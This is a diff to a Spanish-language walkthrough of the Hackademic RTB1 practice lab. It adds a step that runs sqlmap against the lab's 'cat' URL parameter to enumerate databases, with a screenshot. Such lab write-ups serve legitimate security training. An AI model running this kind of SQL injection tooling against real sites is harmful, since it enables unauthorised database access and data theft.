@@ -44,4 +44,9 @@ http://192.168.1.5/Hackademic_RTB1/?cat=1
 ```
 ![4](https://user-images.githubusercontent.com/75953873/171920301-015e4c06-3a1f-4535-9790-f4f450563eb9.png)
 
+- *Paso 4:* Inyección de SQL a base de datos con Sqlmap. 
 
+```
+sqlmap --url 'http://192.168.1.5/Hackademic_RTB1/?cat=1' --dbs --batch
+```
+![5](https://user-images.githubusercontent.com/75953873/171921174-bbf606b5-80d8-4cbc-9a01-8c068de466fc.png)
